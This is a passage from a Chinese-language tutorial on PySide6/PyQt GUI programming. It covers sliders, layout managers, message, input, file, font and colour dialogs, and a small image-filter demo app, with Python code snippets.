src="/posts/d765094b05e7/image-20231115225149471.png" class="" title="image-20231115225149471"><p><strong>纯文本框</strong>虽然只能输出纯文本，但是<strong>优化做得更好</strong>，在载入大批量文本时能<strong>更快加载</strong></p><p>搭配文本框的方法我们能做到一些特殊效果</p><p>例如我们可以使用<code>appendPlainText</code>实现一个程序运行日志的打印效果</p><img src="/posts/d765094b05e7/2023-11-15-23-10-41.gif" class="" title="2023-11-15-23-10-41"><h3 id="滑块-QSlider"><a href="#滑块-QSlider" class="headerlink" title="滑块(QSlider)"></a>滑块(QSlider)</h3><p><code>QSlider</code> 用于提供一个滑动条，允许用户通过拖动滑块在一个范围内选择值。它通常用于获取用户输入的数值，特别是当需要从一个预定义范围中选择时</p><p>我们可以设置滑块的一些基本属性，像<strong>方向、值范围和步进</strong>等等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置滑条为水平，这里需要从PyQt6.QtCore中导入Qt</span></span><br><span class="line">self.slider1 = QSlider(Qt.Orientation.Horizontal)</span><br><span class="line"><span class="comment"># 设置刻度的位置 </span></span><br><span class="line">self.slider1.setTickPosition(QSlider.TickPosition.TicksBelow)</span><br><span class="line"><span class="comment"># 设置最小值和最大值</span></span><br><span class="line">self.slider1.setMinimum(<span class="number">50</span>)</span><br><span class="line">self.slider1.setMaximum(<span class="number">150</span>)</span><br></pre></td></tr></table></figure><p>通常我们会使用滑块的<code>valueChanged</code>信号，来侦测滑块是否滑动</p><p>而滑块的值我们可以通过<code>value()</code>方法获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    self.value = QLabel()</span><br><span class="line">    self.bind()</span><br><span class="line"></span><br><span class="line">    mainlayout = QVBoxLayout() </span><br><span class="line">    mainlayout.addWidget(self.value)</span><br><span class="line">    mainlayout.addWidget(self.slider1)</span><br><span class="line">    self.setLayout(mainlayout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">    self.slider1.valueChanged.connect(self.showSlider)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showSlider</span>(<span class="params">self</span>):</span><br><span class="line">    self.value.setText(<span class="built_in">str</span>(self.slider1.value()))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下：</p><img src="/posts/d765094b05e7/2023-11-16-00-30-38.gif" class="" title="2023-11-16-00-30-38"><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>布局是UI设计中的重要功能</p><h3 id="常见布局控件"><a href="#常见布局控件" class="headerlink" title="常见布局控件"></a>常见布局控件</h3><p>常见的布局控件有以下几种</p><ol><li><p><strong>QVBoxLayout</strong></p><ul><li>垂直布局，小部件会被垂直堆叠。</li><li>用法示例：用于将一组控件从上到下垂直排列。</li></ul></li><li><p><strong>QHBoxLayout</strong></p><ul><li>水平布局，小部件会被水平排列。</li><li>用法示例：用于将一组控件从左到右水平排列。</li></ul></li><li><p><strong>QGridLayout</strong></p><ul><li>网格布局，小部件按行和列排列，形成一个网格。</li><li>用法示例：在需要更精细的控制来放置小部件时使用，如科学应用程序的复杂表单。</li></ul></li><li><p><strong>QFormLayout</strong></p><ul><li>表单布局，专为表单设计，提供了标签和字段的垂直布局。</li><li>用法示例：用于快速创建标准表单，如登录界面或设置面板。</li></ul></li><li><p><strong>QStackedLayout</strong></p><ul><li>堆叠布局，小部件堆叠在一起，每次只显示一个。</li><li>用法示例：用于创建向导或多步骤界面。</li></ul></li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>让我们假设一个场景：</p><p>我们的应用程序由上半部分的设置区与下半部分的功能区组成</p><img src="/posts/d765094b05e7/image-20231116112928282.png" class="" title="image-20231116112928282"><p>首先我们需要创建布局控件的对象实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QVBoxLayout,QHBoxLayout</span><br><span class="line">...</span><br><span class="line">mainlayout = QVBoxLayout()</span><br><span class="line">settinglayout = QHBoxLayout()</span><br><span class="line">visiblelayout = QHBoxLayout()</span><br></pre></td></tr></table></figure><p>我们能往布局控件中放入普通控件，也能在布局控件中<strong>嵌套</strong>布局控件</p><p>在本例中，设置区的水平布局和可视化区的水平布局都被嵌套在最大的垂直布局中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">btn1 = QPushButton(<span class="string">&quot;按钮1&quot;</span>)</span><br><span class="line">btn2 = QPushButton(<span class="string">&quot;按钮2&quot;</span>)</span><br><span class="line">lb1 = QLabel(<span class="string">&quot;标签1&quot;</span>)</span><br><span class="line">lb2 = QLabel(<span class="string">&quot;标签2&quot;</span>)</span><br><span class="line"></span><br><span class="line">mainlayout = QVBoxLayout()</span><br><span class="line">settinglayout = QHBoxLayout()</span><br><span class="line">visiblelayout = QHBoxLayout()</span><br><span class="line"></span><br><span class="line">settinglayout.addWidget(btn1)</span><br><span class="line">settinglayout.addWidget(btn2)</span><br><span class="line">visiblelayout.addWidget(lb1)</span><br><span class="line">visiblelayout.addWidget(lb2)</span><br><span class="line">mainlayout.addLayout(settinglayout)</span><br><span class="line">mainlayout.addLayout(visiblelayout)</span><br><span class="line">self.setLayout(mainlayout)</span><br></pre></td></tr></table></figure><p>向布局中添加控件使用<code>addWidget</code>，嵌套布局则使用<code>addLayout</code></p><p>效果如下</p><img src="/posts/d765094b05e7/image-20231116142828596.png" class="" title="image-20231116142828596"><p>当然，上述代码可以通过改用QFormLayout来简化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">formlayout = QFormLayout()</span><br><span class="line">formlayout.addRow(btn1,btn2)</span><br><span class="line">formlayout.addRow(lb1,lb2)</span><br><span class="line">mainlayout.addLayout(formlayout)</span><br></pre></td></tr></table></figure><p>在格子布局中，我们可以将整个界面想象成由行列索引的格子组成</p><p>向格子布局控件传入的参数有5个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addwidget(控件名,行数,列数,长,宽)</span><br></pre></td></tr></table></figure><p>下面的代码则是利于格子布局简化的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gridlayout = QGridLayout()</span><br><span class="line">gridlayout.addWidget(btn1,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">gridlayout.addWidget(btn2,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">gridlayout.addWidget(lb1,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">gridlayout.addWidget(lb2,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">mainlayout.addLayout(gridlayout)</span><br></pre></td></tr></table></figure><h3 id="布局的好处"><a href="#布局的好处" class="headerlink" title="布局的好处"></a>布局的好处</h3><p>在 PySide6中使用布局有许多好处，主要包括：</p><ol><li><strong>自动调整大小和位置</strong>：布局自动管理窗口组件（widgets）的大小和位置。当用户调整主窗口的大小时，布局确保内部组件适当地调整其大小和位置，使界面保持一致和专业的外观。</li><li><strong>更容易的界面维护</strong>：使用布局可以使代码更加清晰和易于维护。你可以更容易地添加、移除或修改组件，而不用担心手动更新每个组件的位置和大小。</li><li><strong>跨平台一致性</strong>：布局帮助确保应用程序在不同操作系统和设备上提供一致的用户体验，因为它们会根据不同平台的显示特性（如分辨率和字体大小）自动调整组件。</li><li><strong>适应性和响应性</strong>：布局提供了更好的适应性，使得界面能够适应不同的屏幕尺寸和方向，这对于现代多设备应用程序特别重要。</li></ol><h2 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h2><p>对话框是一种特殊的窗口，用于短暂的、特定目的的交互，通常在完成其任务后就会被关闭。它们与主应用程序窗口相比较独立，但通常是<strong>模态</strong>的，即在对话框关闭之前，用户不能与主应用程序的其他部分交互。</p><h3 id="消息框-QMessageBox"><a href="#消息框-QMessageBox" class="headerlink" title="消息框(QMessageBox)"></a>消息框(QMessageBox)</h3><p><code>QMessageBox</code>是用于显示消息的标准对话框。这些对话框通常用于提供信息、询问问题或显示警告。</p><ol><li><strong>模态性质</strong>：<code>QMessageBox</code> 是模态对话框，这意味着当它打开时，它会阻止用户与程序的其他部分交互，直到对话框被关闭。</li><li><strong>标准按钮</strong>：它提供了一组标准按钮（如 Ok, Cancel, Yes, No 等），可以根据需要选择哪些按钮出现在对话框中。</li><li><strong>图标显示</strong>：<code>QMessageBox</code> 可以显示不同类型的图标（如信息、警告、错误、问号），这有助于向用户传达对话框的性质或重要性。</li><li><strong>简单的文本和格式化文本</strong>：它可以显示简单的文本信息或更复杂的格式化文本，如富文本。</li><li><strong>返回值</strong>：用户对 <code>QMessageBox</code> 的响应（如点击哪个按钮）可以通过对话框的返回值来捕获，这对于程序的决策流程非常重要。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QMessageBox</span><br></pre></td></tr></table></figure><p>不同的消息框显示效果如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QMessageBox.information(self, <span class="string">&quot;标题&quot;</span>, <span class="string">&quot;这是一个提示&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/posts/d765094b05e7/image-20231116212542576.png" class="" title="image-20231116212542576"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QMessageBox.warning(self, <span class="string">&quot;标题&quot;</span>, <span class="string">&quot;这是一个警告&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/posts/d765094b05e7/image-20231116212619782.png" class="" title="image-20231116212619782"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QMessageBox.critical(self, <span class="string">&quot;标题&quot;</span>, <span class="string">&quot;这是一个错误&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/posts/d765094b05e7/image-20231116212628253.png" class="" title="image-20231116212628253"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QMessageBox.question(self, <span class="string">&quot;标题&quot;</span>, <span class="string">&quot;这是一个提问&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/posts/d765094b05e7/image-20231116212637232.png" class="" title="image-20231116212637232"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QMessageBox.about(self, <span class="string">&quot;标题&quot;</span>, <span class="string">&quot;这是一个关于&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/posts/d765094b05e7/image-20231116212648422.png" class="" title="image-20231116212648422"><p>第四个和第五个参数用于设置可供用户点击的选项以及默认选项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QMessageBox.information(self, <span class="string">&quot;标题&quot;</span>, <span class="string">&quot;这是一个提示&quot;</span>, QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)</span><br></pre></td></tr></table></figure><img src="/posts/d765094b05e7/image-20231116213020453.png" class="" title="image-20231116213020453"><p>我们可以将消息框赋值给一个变量，这样我们就能从返回值中得知用户的选择</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">answer = QMessageBox.information(self, <span class="string">&quot;标题&quot;</span>, <span class="string">&quot;这是一个提示&quot;</span>, QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)</span><br><span class="line"><span class="keyword">if</span> answer == QMessageBox.Yes:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="输入对话框-QInputDialog"><a href="#输入对话框-QInputDialog" class="headerlink" title="输入对话框(QInputDialog)"></a>输入对话框(QInputDialog)</h3><p><code>QInputDialog</code>提供了一个简单方便的方式来获取用户输入的单个值。这些值可以是字符串、数字或列表中的选项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QInputDialog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取用户输入的字符串</span></span><br><span class="line">text, ok = QInputDialog.getText(<span class="literal">None</span>, <span class="string">&quot;输入对话框&quot;</span>, <span class="string">&quot;请输入文本:&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> ok <span class="keyword">and</span> text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;用户输入:&quot;</span>, text)</span><br></pre></td></tr></table></figure><p>使用这个对话框可以方便地从用户那里获取输入，而不必创建复杂的表单。</p><img src="/posts/d765094b05e7/image-20231116215004394.png" class="" title="image-20231116215004394"><p><strong>当且仅当用户点击OK</strong>时，返回的<strong>第二个参数为True</strong></p><p>当然，除了让用户输入文本，我们也可以让用户输入数字或列表中的选项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">    btn1 = QPushButton(<span class="string">&#x27;获取一个整形数字&#x27;</span>)</span><br><span class="line">    btn1.clicked.connect(self.getIntDialog)</span><br><span class="line"></span><br><span class="line">    btn2 = QPushButton(<span class="string">&#x27;获取一个浮点数字&#x27;</span>)</span><br><span class="line">    btn2.clicked.connect(self.getFloatDialog)</span><br><span class="line"></span><br><span class="line">    btn3 = QPushButton(<span class="string">&#x27;获取一个Item&#x27;</span>)</span><br><span class="line">    btn3.clicked.connect(self.getItemDialog)</span><br><span class="line"></span><br><span class="line">    mainlayout = QVBoxLayout()</span><br><span class="line">    mainlayout.addWidget(btn1)</span><br><span class="line">    mainlayout.addWidget(btn2)</span><br><span class="line">    mainlayout.addWidget(btn3)</span><br><span class="line">    self.setLayout(mainlayout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getIntDialog</span>(<span class="params">self</span>):</span><br><span class="line">    num,ok = QInputDialog.getInt(self,<span class="string">&quot;获取一个整形数字&quot;</span>,<span class="string">&quot;请输入一个整数&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户取消了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFloatDialog</span>(<span class="params">self</span>):</span><br><span class="line">    num,ok = QInputDialog.getDouble(self,<span class="string">&quot;获取一个浮点数字&quot;</span>,<span class="string">&quot;请输入一个浮点数&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户取消了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getItemDialog</span>(<span class="params">self</span>):</span><br><span class="line">    items = [<span class="string">&quot;C&quot;</span>,<span class="string">&quot;C++&quot;</span>,<span class="string">&quot;Python&quot;</span>,<span class="string">&quot;Java&quot;</span>,<span class="string">&quot;Rust&quot;</span>]</span><br><span class="line">    item,ok = QInputDialog.getItem(self,<span class="string">&quot;获取一个Item&quot;</span>,<span class="string">&quot;请选择一个编程语言&quot;</span>,items)</span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用户取消了&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然设置输入框时，我们也能<strong>限制输入范围和设置默认值</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num,ok = QInputDialog.getInt(self,<span class="string">&quot;获取一个整形数字&quot;</span>,<span class="string">&quot;请输入一个整数&quot;</span>,<span class="number">20</span>,<span class="number">0</span>,<span class="number">100</span>,<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>此时我们设置输入框的选择范围为0-100，步长为10，默认值为20</p><img src="/posts/d765094b05e7/2023-11-16-22-06-07.gif" class="" title="2023-11-16-22-06-07"><h3 id="文件对话框-QFileDialog"><a href="#文件对话框-QFileDialog" class="headerlink" title="文件对话框(QFileDialog)"></a>文件对话框(QFileDialog)</h3><p><code>QFileDialog</code>允许用户选择文件或文件夹，这在需要打开或保存文件时非常有用。</p><p>文件对话框支持过滤文件类型，使用户能够更容易地找到或保存特定类型的文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">btn = QPushButton(<span class="string">&#x27;上传文件&#x27;</span>)</span><br><span class="line">       btn.clicked.connect(<span class="keyword">lambda</span>:<span class="built_in">print</span>(QFileDialog.getOpenFileName(self,<span class="string">&#x27;标题&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;py文件(*.py)&#x27;</span>)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们为按钮绑定上文件对话框，点击后会弹出如下窗口</p><img src="/posts/d765094b05e7/image-20231116225146511.png" class="" title="image-20231116225146511"><p>由于我们传入的第三个参数为<code>.</code>，文件对话框一开始所在的目录即为当前目录</p><p>同时第四个参数括号中的类型限制了我们能选择的文件名和文件类型<code>*.py</code>，这里<code>*</code>为通配符</p><p>返回值有两个，分别是<strong>选中文件的绝对路径</strong>和<strong>选择的文件过滤规则</strong></p><p>我们能设置多种文件过滤规则，只需在中间用<code>;;</code>隔开</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btn.clicked.connect(<span class="keyword">lambda</span>:<span class="built_in">print</span>(QFileDialog.getOpenFileName(self,<span class="string">&#x27;标题&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;py文件(*.py);;png文件(*.png);;ui文件(*.ui)&#x27;</span>)))</span><br></pre></td></tr></table></figure><img src="/posts/d765094b05e7/image-20231116225915240.png" class="" title="image-20231116225915240"><p>当然除了打开单个文件，QFileDialog还支持打开多个文件、打开文件夹等操作</p><div class="table-container"><table><thead><tr><th>方法</th><th>功能</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td>getOpenFileNames</td><td>打开多个文件</td><td>self,窗体名称,对话框默认打开目录.文件过滤规则</td><td>文件路径(绝对)[列表]，选择的过滤规则</td></tr><tr><td>getExistingDirectory</td><td>打开一个文件夹</td><td>self,窗体名称,对话框默认打开目录.</td><td>文件夹路径(绝对)</td></tr><tr><td>getSaveFileName</td><td>保存一个文件</td><td>self,窗体名称,对话框默认打开目录.保存文件类型</td><td>文件路径(绝对)，选择的文件类型</td></tr></tbody></table></div><h3 id="字体对话框-QFontDialog"><a href="#字体对话框-QFontDialog" class="headerlink" title="字体对话框(QFontDialog)"></a>字体对话框(QFontDialog)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QFontDialog</span><br><span class="line">self.edit = QTextEdit()</span><br><span class="line">btn = QPushButton(<span class="string">&#x27;点我选择字体&#x27;</span>)</span><br><span class="line">btn.clicked.connect(self.changeFont)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeFont</span>(<span class="params">self</span>):</span><br><span class="line">    ok,font = QFontDialog.getFont()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ok: <span class="keyword">return</span></span><br><span class="line">    self.edit.setCurrentFont(font)</span><br></pre></td></tr></table></figure><p>该对话框可供用户选择字体</p><p>窗口效果如下</p><img src="/posts/d765094b05e7/image-20231117113316946.png" class="" title="image-20231117113316946"><p>返回值中的第二个参数font可以直接用于设置字体</p><h3 id="颜色对话框-QColorDialog"><a href="#颜色对话框-QColorDialog" class="headerlink" title="颜色对话框(QColorDialog)"></a>颜色对话框(QColorDialog)</h3><p>相比于字体对话框，颜色对话框只会有一个返回值，即<code>color</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">color = QColorDialog.getColor()</span><br></pre></td></tr></table></figure><h2 id="小项目：图像处理"><a href="#小项目：图像处理" class="headerlink" title="小项目：图像处理"></a>小项目：图像处理</h2><p>我们来做一个基于刚学的对话框、下拉框、滑块等控件的图像处理小程序</p><p>业务逻辑如下</p><ol><li><p><strong>上传图片</strong>：用户可以通过点击“上传图片”按钮来选择并上传一张图片。</p><p>这里需要用到<code>QFileDialog</code>，并设置文件过滤规则为图片格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">self.uploadButton = QPushButton(<span class="string">&quot;上传图片&quot;</span>)</span><br><span class="line">self.uploadButton.clicked.connect(self.uploadImage)</span><br><span class="line">layout.addWidget(self.uploadButton)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uploadImage</span>(<span class="params">self</span>):</span><br><span class="line">    filePath, _ = QFileDialog.getOpenFileName(self, <span class="string">&quot;选择图片&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Image files (*.jpg *.png)&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> filePath:</span><br><span class="line">        self.currentImage = Image.<span class="built_in">open</span>(filePath)</span><br><span class="line">        self.applyEffect()</span><br></pre></td></tr></table></figure></li><li><p><strong>选择处理效果</strong>：用户可以从下拉框中选择想要应用的图像处理效果：去噪、模糊或锐化。</p><p>当有需要用户做出选择的场景时，下拉框是不错的选择</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.effectComboBox = QComboBox()</span><br><span class="line">self.effectComboBox.addItems([<span class="string">&quot;去噪&quot;</span>, <span class="string">&quot;模糊&quot;</span>, <span class="string">&quot;锐化&quot;</span>])</span><br><span class="line">layout.addWidget(self.effectComboBox)</span><br></pre></td></tr></table></figure></li><li><p><strong>调整效果强度</strong>：通过滑动条，用户可以调整所选图像处理效果的强度。</p><p>在实际应用场景时，滑动条的上下范围往往受到实际功能的限制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 滑动条</span></span><br><span class="line">self.slider = QSlider(Qt.Horizontal)</span><br><span class="line">self.slider.setMinimum(<span class="number">1</span>)</span><br><span class="line">self.slider.setMaximum(<span class="number">10</span>)</span><br><span class="line">self.slider.setTickInterval(<span class="number">1</span>)</span><br><span class="line">self.slider.setTickPosition(QSlider.TicksBelow)</span><br><span class="line">self.slider.valueChanged.connect(self.applyEffect)</span><br><span class="line">layout.addWidget(self.slider)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">applyEffect</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> self.currentImage:</span><br><span class="line">        effect = self.effectComboBox.currentText()</span><br><span class="line">        value = self.slider.value()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对于去噪和锐化，确保滤波器大小是奇数且大于等于3</span></span><br><span class="line">        filter_size = <span class="built_in">max</span>(<span class="number">3</span>, <span class="number">2</span> * value + <span class="number">1</span>) <span class="keyword">if</span> effect != <span class="string">&quot;模糊&quot;</span> <span class="keyword">else</span> value</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> effect == <span class="string">&quot;去噪&quot;</span>:</span><br><span class="line">            self.processedImage = self.currentImage.<span class="built_in">filter</span>(ImageFilter.MedianFilter(filter_size))</span><br><span class="line">        <span class="keyword">elif</span> effect == <span class="string">&quot;模糊&quot;</span>:</span><br><span class="line">            self.processedImage = self.currentImage.<span class="built_in">filter</span>(ImageFilter.GaussianBlur(filter_size))</span><br><span class="line">        <span class="keyword">elif</span> effect == <span class="string">&quot;锐化&quot;</span>:</span><br><span class="line">            self.processedImage = self.currentImage.<span class="built_in">filter</span>(ImageFilter.UnsharpMask(radius=filter_size, percent=<span class="number">150</span>))</span><br><span class="line">        self.displayImage()</span><br></pre></td></tr></table></figure><p>在本例中，滑条的值传给滤波器，在传入之前也需要做一些处理</p></li><li><p><strong>实时预览</strong>：应用所选效果后，处理后的图像将实时显示在界面上。</p><p>我们直接将处理后的图片设置到<code>label</code>上即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.imageLabel = QLabel(<span class="string">&quot;这里显示处理后的图像&quot;</span>)</span><br><span class="line">layout.addWidget(self.imageLabel)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">displayImage</span>(<span class="params">self</span>):</span><br><span class="line">  self.imageLabel.setPixmap(self.processedImage.toqpixmap())</span><br></pre></td></tr></table></figure></li></ol><p>最终应用程序的效果如下</p><img src="/posts/d765094b05e7/2023-11-17-09-36-52.gif" class="" title="2023-11-17-09-36-52"><h2 id="子窗口-多窗口"><a href="#子窗口-多窗口" class="headerlink" title="子窗口/多窗口"></a>子窗口/多窗口</h2><p><strong>子窗口（Child Windows）</strong></p><p>子窗口是指附属于主窗口的窗口。它们通常用于显示应用程序的次要功能或额外信息。子窗口的一些特点包括：</p><ol><li><strong>依赖性</strong>：子窗口依赖于父窗口。当父窗口被关闭时，子窗口也会随之关闭。</li><li><strong>空间范围</strong>：子窗口通常在父窗口的内部空间中显示，但也可以浮动或被拖出父窗口。</li><li><strong>功能性</strong>：子窗口通常用于与主窗口内容相关的特定功能，如设置面板、帮助文档、附加工具等。</li><li><strong>生命周期管理</strong>：子窗口的生命周期通常由父窗口管理。</li></ol><p><strong>多窗口（Multiple 